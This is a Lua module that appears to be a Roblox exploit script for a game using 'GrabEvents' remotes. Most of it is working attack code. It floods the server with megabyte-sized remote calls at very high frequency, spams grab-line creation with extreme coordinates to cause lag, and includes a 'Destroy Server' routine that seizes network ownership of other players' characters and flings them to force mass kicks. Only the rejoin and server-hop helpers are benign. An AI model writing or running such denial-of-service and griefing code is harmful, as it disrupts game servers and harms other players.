local Shared = (getgenv and getgenv().FTAP_Shared) or require(script.Parent.Shared)
local Server = {}

-- Advanced Server Lag / Packet Lag
Server.PacketLag = {
    enabled = false,
    loopThread = nil,
    packetSize = 1000000 -- Default to 1MB based on XOCU
}

function Server.StartPacketLag()
    Server.PacketLag.enabled = true
    Server.PacketLag.loopThread = task.spawn(function()
        local GrabEvents = Shared.ReplicatedStorage:WaitForChild("GrabEvents")
        local ExtendGrabLine = GrabEvents:WaitForChild("ExtendGrabLine")
        while Server.PacketLag.enabled do
            pcall(function()
                ExtendGrabLine:FireServer(string.rep("A", Server.PacketLag.packetSize))
            end)
            task.wait(3e-05) -- High frequency spam
        end
    end)
end

function Server.StopPacketLag()
    Server.PacketLag.enabled = false
    if Server.PacketLag.loopThread then
        task.cancel(Server.PacketLag.loopThread)
        Server.PacketLag.loopThread = nil
    end
end

-- Advanced Line Lag
Server.LineLag = {
    enabled = false,
    loopThread = nil
}

function Server.StartLineLag()
    Server.LineLag.enabled = true
    Server.LineLag.loopThread = task.spawn(function()
        local CreateGrabLine = Shared.ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("CreateGrabLine")
        local spawnLoc = Shared.Workspace:FindFirstChild("SpawnLocation") or Shared.Workspace:FindFirstChild("Spawn") or Shared.GetRoot()
        while Server.LineLag.enabled and spawnLoc do
            for i = 1, 500 do -- Original XOCU spam rate
                pcall(function()
                    CreateGrabLine:FireServer(spawnLoc, CFrame.new(math.random(-1e9, 1e9), math.random(-1e9, 1e9), math.random(-1e9, 1e9)))
                end)
            end
            task.wait(0.5)
        end
    end)
end

function Server.StopLineLag()
    Server.LineLag.enabled = false
    if Server.LineLag.loopThread then
        task.cancel(Server.LineLag.loopThread)
        Server.LineLag.loopThread = nil
    end
end

-- Destroy Server
Server.DestroyServer = {
    active = false
}

function Server.DestroyServerAction()
    local createGrab = Shared.ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("CreateGrabLine")
    local setOwner = Shared.ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
    local destroyLine = Shared.ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("DestroyGrabLine")
    
    Shared.Notify("Server", "Destroying Server... (Mass Kick & Lag)", 3)
    
    task.spawn(function()
        for i = 1, 10 do -- Repeat to ensure effectiveness
            for _, player in ipairs(Shared.Players:GetPlayers()) do
                if player ~= Shared.LocalPlayer then
                    local char = player.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    if root then
                        pcall(function()
                            setOwner:FireServer(root, root.CFrame)
                            task.wait()
                            destroyLine:FireServer(root)
                            -- Rinnegan Fling on mass scale
                            local bv = Instance.new("BodyVelocity")
                            bv.MaxForce = Vector3.new(0, math.huge, 0)
                            bv.Velocity = Vector3.new(0, 9e12, 0)
                            bv.Parent = root
                            game:GetService("Debris"):AddItem(bv, 0.1)
                        end)
                    end
                end
            end
            task.wait(0.1)
        end
    end)
    
    -- Start intense lag
    Server.StartPacketLag()
    Server.StartLineLag()
end
-- Rejoin & Server Hop
function Server.Rejoin()
    pcall(function()
        local ts = Shared.TeleportService
        if ts then
            ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, Shared.LocalPlayer)
        end
    end)
    Shared.Notify("Server", "Rejoining current server...", 2)
end

function Server.ServerHop()
    pcall(function()
        local ts = Shared.TeleportService
        local http = Shared.HttpService
        if ts and http then
            local serversApi = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
            local raw = game:HttpGet(serversApi)
            local data = http:JSONDecode(raw)
            if data and data.data then
                for _, s in ipairs(data.data) do
                    if s.id ~= game.JobId and s.playing < s.maxPlayers then
                        ts:TeleportToPlaceInstance(game.PlaceId, s.id, Shared.LocalPlayer)
                        return
                    end
                end
            end
        end
    end)
    Shared.Notify("Server", "Searching for new server...", 2)
end

return Server